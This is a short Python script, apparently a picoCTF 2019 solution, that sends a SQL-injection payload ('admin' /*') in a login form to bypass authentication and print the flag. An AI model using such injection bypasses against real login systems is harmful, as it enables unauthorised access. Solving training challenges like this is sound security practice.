from requests import *
from bs4 import BeautifulSoup

url = 'http://2019shell1.picoctf.com:7411/login.php'
data = {
    'username' : "admin' /*",
    'password' : '123',
    'debug' : '0'
}

r = post(url , data=data)
soup = BeautifulSoup(r.text , 'html.parser')
flag = soup.find('p').get_text()
print(flag)
